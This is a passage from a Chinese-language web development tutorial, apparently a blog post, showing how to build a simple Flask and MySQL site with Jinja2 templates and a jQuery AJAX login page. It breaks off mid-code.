python</h4><p>python在计算机语言不同于非常难学的C语言，非常流行的Java语言，适合初学者的Basic语言，适合网页编程的JavaScript语言等等。它以其代码风格简洁，易学闻名，却也因其的运行效率低下被一些大项目抛弃。其特性使它适合做一些个人小型项目，而不是像c系列的系统。</p><p>建议参考网站<br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400">廖雪峰的官方网站</a><br><a href="https://www.runoob.com/python/python-tutorial.html">菜鸟教程</a></p><p>而本教程主要内容为python作后端，html+js+css做前端，所以不会过于深入python的语法。</p><blockquote><p>推荐python环境搭建使用anacoda<br>本文使用的版本为3.6.2</p></blockquote><h4 id="4-1-2-flask"><a href="#4-1-2-flask" class="headerlink" title="4.1.2 flask"></a>4.1.2 flask</h4><p>Flask是一个基于Jinja2和Werkzeug的python微框架，有以下特点：</p><ul><li>内建的单元测试支持</li><li>模板使用Jinjia2</li><li>大量文档</li><li>客户端会话使用安全cookies</li><li>开发服务器和调试器</li><li>Restful请求</li><li>与WSGI 1.0兼容</li><li>基于unicode</li><li>大量的扩展<br>flask是微框架，比较灵活，适合小型项目。</li></ul><p>其他python框架参考<a href="https://www.jianshu.com/p/30dbd8c3f7e4">点击跳转简书</a><br><a href="https://dormousehole.readthedocs.io/en/latest/">flask官网</a></p><h4 id="4-1-3-flask-环境安装"><a href="#4-1-3-flask-环境安装" class="headerlink" title="4.1.3 flask 环境安装"></a>4.1.3 flask 环境安装</h4><p>在命令行中运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure><blockquote><p>作者是使用vscode编辑，实际上使用任何可以使用任何的编辑器（例记事本）都行</p></blockquote><h4 id="4-1-4-flask-基本文件结构"><a href="#4-1-4-flask-基本文件结构" class="headerlink" title="4.1.4 flask 基本文件结构"></a>4.1.4 flask 基本文件结构</h4><p>首先要新建文件夹如以下构造<br><strong>flask-demo</strong>(项目总文件夹，名字自取)<br><strong>–templates</strong>(前端部分文件夹)<br><strong>-run.py</strong>(后端文件，名字自取)<br><strong>-tempcoderunnerfile.py</strong>(系统缓存文件)</p><p>如图<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-11.png" alt="在这里插入图片描述"></p><h3 id="4-2-后端实现"><a href="#4-2-后端实现" class="headerlink" title="4.2 后端实现"></a>4.2 后端实现</h3><h4 id="4-2-1-flask-基本框架"><a href="#4-2-1-flask-基本框架" class="headerlink" title="4.2.1 flask 基本框架"></a>4.2.1 flask 基本框架</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路径对应的执行函数，有路径就对应路径名，没路径就对应index</span></span><br><span class="line"><span class="comment">#如@app.route(&#x27;/login&#x27;) 对应def login()</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="string">&#x27;5000&#x27;</span>, debug=<span class="literal">True</span>)<span class="comment">#映射</span></span><br></pre></td></tr></table></figure><p>这段代码的作用就是把这个项目映射到127.0.0.1:5000的ip上，不过由于还没有挂网页文件上去，所以看不到什么效果</p><h4 id="4-2-2-flask-显示前端页面"><a href="#4-2-2-flask-显示前端页面" class="headerlink" title="4.2.2 flask 显示前端页面"></a>4.2.2 flask 显示前端页面</h4><p>在flask框架中，使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br></pre></td></tr></table></figure><p>可以在用户页面上显示index.html的内容也就是返回index.html</p><h4 id="4-2-3-flask-给前端传值"><a href="#4-2-3-flask-给前端传值" class="headerlink" title="4.2.3 flask 给前端传值"></a>4.2.3 flask 给前端传值</h4><p>想要flask给前端传值，只需要在上面的函数中增加几个参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template(<span class="string">&#x27;index.html&#x27;</span>,a=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里给前端也就是index.html，传了参数名为a值为1，可以在前端接收</p><h4 id="4-2-4-flask-接收前端传值"><a href="#4-2-4-flask-接收前端传值" class="headerlink" title="4.2.4 flask 接收前端传值"></a>4.2.4 flask 接收前端传值</h4><p>实现这个功能，要在route和处理函数里面增加，例如前端给后端a&#x3D;1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    l = request.args.get(<span class="string">&#x27;a&#x27;</span>, <span class="number">0</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br></pre></td></tr></table></figure><h3 id="4-3-前端实现"><a href="#4-3-前端实现" class="headerlink" title="4.3 前端实现"></a>4.3 前端实现</h3><h4 id="4-3-1-分层"><a href="#4-3-1-分层" class="headerlink" title="4.3.1 分层"></a>4.3.1 分层</h4><p>在flask 框架中提供了一个小巧简单又方便的把多个文件组合在一起展示的功能，例如：我的全部网页都有一个相同的<code>&lt;head&gt;</code>部分，使用flask框架就可以组合在一起通过在前端插入代码。</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;head.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>head.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hi<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://lib.sinaapp.com/js/jquery/2.0.2/jquery-2.0.2.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% block body %&#125;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-3-2-接收参数"><a href="#4-3-2-接收参数" class="headerlink" title="4.3.2 接收参数"></a>4.3.2 接收参数</h4><p>正如我们上面讲的后传前的方法，前端接收后端的参数也十分简单，例如后端传给前端a&#x3D;1</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h</span>&gt;</span>&#123;&#123; a &#125;&#125;<span class="tag">&lt;/<span class="name">h</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样子就可以在h标签中显示1，此外，flask还提供了在前端中判断参数的方法，例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&#123;% if a==1 %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="4-3-3-前端给后端传参"><a href="#4-3-3-前端给后端传参" class="headerlink" title="4.3.3 前端给后端传参"></a>4.3.3 前端给后端传参</h4><p>这里只能使用post或者get方法，笔者在这推荐jq的ajax异步，例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sign_up</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> x = $(<span class="string">&quot;#i&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">        <span class="keyword">if</span> (x != <span class="string">&quot;&quot;</span> &amp;&amp; x != <span class="string">&quot; &quot;</span>) &#123;</span><br><span class="line">            $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">                <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="attr">url</span>: <span class="string">&quot;&#123;&#123; url_for(&#x27;login&#x27;) &#125;&#125;&quot;</span>,</span><br><span class="line">                <span class="comment">//url_for是获取路径</span></span><br><span class="line">                <span class="attr">data</span>: &#123;</span><br><span class="line">                    <span class="attr">sign_up_name</span>: x</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">dataType</span>: <span class="string">&quot;html&quot;</span>,</span><br><span class="line">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="4-3-4-登录页面前端"><a href="#4-3-4-登录页面前端" class="headerlink" title="4.3.4 登录页面前端"></a>4.3.4 登录页面前端</h4><p>新建一个<code>login.html</code> 文件，里面写上最简单的登录页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;head.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>sign in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;u&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">buttom</span> <span class="attr">onclick</span>=<span class="string">&quot;sign_in()&quot;</span>&gt;</span>确定<span class="tag">&lt;/<span class="name">buttom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">sign_up</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> x = $(<span class="string">&quot;#i&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (x != <span class="string">&quot;&quot;</span> &amp;&amp; x != <span class="string">&quot; &quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&quot;&#123;&#123; url_for(&#x27;login&#x27;) &#125;&#125;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">sign_up_name</span>: x</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">dataType</span>: <span class="string">&quot;html&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>新建一个<code>head.html</code>文件，里面存放标题和引入jq，这对我们以后增加大量页面有帮助</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hi<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--- 引入新浪的jq---&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://lib.sinaapp.com/js/jquery/2.0.2/jquery-2.0.2.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% block body %&#125;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-4-前端-后端的简单组合"><a href="#4-4-前端-后端的简单组合" class="headerlink" title="4.4 前端+后端的简单组合"></a>4.4 前端+后端的简单组合</h3><p>run.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, url_for, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>,  debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>templates\head.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hi<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--- 引入新浪的jq---&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://lib.sinaapp.com/js/jquery/2.0.2/jquery-2.0.2.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% block body %&#125;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>templates\index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;head.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>实践图:<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-12.png" alt="调试和文件夹"><br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-13.png" alt="成品图"></p><blockquote><p>一定要把网页模板文件放在templates目录下，run.py和templates同一目录<br>访问这个网页要先运行run.py，然后在浏览器输入127.0.0.1:5000</p></blockquote><h3 id="4-5-登录功能准备"><a href="#4-5-登录功能准备" class="headerlink" title="4.5 登录功能准备"></a>4.5 登录功能准备</h3><h4 id="4-5-1-python中操控mysql"><a href="#4-5-1-python中操控mysql" class="headerlink" title="4.5.1 python中操控mysql"></a>4.5.1 python中操控mysql</h4><p>要想做一个登录系统，数据库是必不可少的，本文用了mysql做数据库，相关教程可以自行百度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">db = MySQLdb.connect(<span class="string">&quot;地址（一般是localhost）&quot;</span>, <span class="string">&quot;用户名（一般是root）&quot;</span>, <span class="string">&quot;密码&quot;</span>,<span class="string">&quot;数据库名&quot;</span>)<span class="comment">#连接数据库</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数据库连接&quot;</span>)</span><br><span class="line">   <span class="comment"># 使用cursor()方法获取操作游标</span></span><br><span class="line">   cursor = db.cursor()</span><br><span class="line">   <span class="comment"># SQL 插入语句</span></span><br><span class="line">   sql = <span class="string">&quot;mysql语句&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;取注册位数&quot;</span>)</span><br><span class="line">   <span class="comment"># 执行sql语句</span></span><br><span class="line">   cursor.execute(sql)</span><br><span class="line">   <span class="comment"># 提交到数据库执行</span></span><br><span class="line">   db.commit()</span><br><span class="line">   results = cursor.fetchall()<span class="comment">#结果</span></span><br></pre></td></tr></table></figure><h4 id="4-5-2-安装数据库"><a href="#4-5-2-安装数据库" class="headerlink" title="4.5.2 安装数据库"></a>4.5.2 安装数据库</h4><p><a href="https://www.runoob.com/mysql/mysql-install.html">菜鸟教程</a></p><h4 id="4-5-3-安装mysqlclient-python库"><a href="#4-5-3-安装mysqlclient-python库" class="headerlink" title="4.5.3 安装mysqlclient python库"></a>4.5.3 安装mysqlclient python库</h4><p>从<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python">下载地址</a>下载对应python版本的mysqlclient库，然后打开<code>cmd</code>命令提示符，cd到下载目录下，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install xxx.whl</span><br></pre></td></tr></table></figure><p>安装库</p><h4 id="4-5-4-mysql语句教程"><a href="#4-5-4-mysql语句教程" class="headerlink" title="4.5.4 mysql语句教程"></a>4.5.4 mysql语句教程</h4><p><a href="https://www.runoob.com/mysql/mysql-tutorial.html">菜鸟教程</a></p><h3 id="4-6-mysql-创建数据表"><a href="#4-6-mysql-创建数据表" class="headerlink" title="4.6 mysql 创建数据表"></a>4.6 mysql 创建数据表</h3><h4 id="4-6-1-登录mysql"><a href="#4-6-1-登录mysql" class="headerlink" title="4.6.1 登录mysql"></a>4.6.1 登录mysql</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p>然后输入密码，其中<code>root</code>为用户名</p><h4 id="4-6-2-进入web库"><a href="#4-6-2-进入web库" class="headerlink" title="4.6.2.进入web库"></a>4.6.2.进入<code>web</code>库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use web;</span><br></pre></td></tr></table></figure><h4 id="4-6-3-创建数据表"><a href="#4-6-3-创建数据表" class="headerlink" title="4.6.3.创建数据表"></a>4.6.3.创建数据表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `users`(</span><br><span class="line">       `uid` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">        `name` VARCHAR(100) NOT NULL,</span><br><span class="line">        `udate` DATE NOT NULL,</span><br><span class="line">        PRIMARY KEY ( `uid` )</span><br><span class="line">     )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">      ALTER TABLE users ADD unique(`name`)</span><br></pre></td></tr></table></figure><p>其中</p><ul><li>第2行<code>uid</code>是用户排行，为int类型，即整数，<code>AUTO_INCREMENT</code>为自增</li><li>第3行<code>name</code>是用户名，为varchar(100)，即100字符内的字符串，不为空</li><li>第4行<code>udate</code>是注册日期吧，不为空</li><li>第5行设置<code>uid</code>为键值</li><li>第6行设置utf8编码</li><li>第7行设置用户名为唯一，不可重复</li></ul><h3 id="4-7-前端登录页面"><a href="#4-7-前端登录页面" class="headerlink" title="4.7 前端登录页面"></a>4.7 前端登录页面</h3><h4 id="4-7-1-目录"><a href="#4-7-1-目录" class="headerlink" title="4.7.1 目录"></a>4.7.1 目录</h4><p>|flask-demo<br>|-templates<br>|–index.html<br>|–login.html<br>|–head.html<br>|-run.py</p><h4 id="4-7-2-前端代码"><a href="#4-7-2-前端代码" class="headerlink" title="4.7.2 前端代码"></a>4.7.2 前端代码</h4><p>login.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;head.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>sign up<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;i&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">buttom</span> <span class="attr">onclick</span>=<span class="string">&quot;sign_up()&quot;</span>&gt;</span>确定<span class="tag">&lt;/<span class="name">buttom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>sign in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;u&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">buttom</span> <span class="attr">onclick</span>=<span class="string">&quot;sign_in()&quot;</span>&gt;</span>确定<span class="tag">&lt;/<span class="name">buttom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">sign_up</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> x = $(<span class="string">&quot;#i&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (x != <span class="string">&quot;&quot;</span> &amp;&amp; x != <span class="string">&quot; &quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,<span class="comment">//&#123;&#123; url_for(&#x27;login_in&#x27;) &#125;&#125;取login_in页面的url地址</span></span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&quot;&#123;&#123; url_for(&#x27;login_in&#x27;) &#125;&#125;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">sign_up_name</span>: x</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">dataType</span>: <span class="string">&quot;html&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (data == <span class="string">&quot;haven&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">alert</span>(<span class="string">&quot;已经有这个用户名了&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;./login&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">sign_in</span>(<span 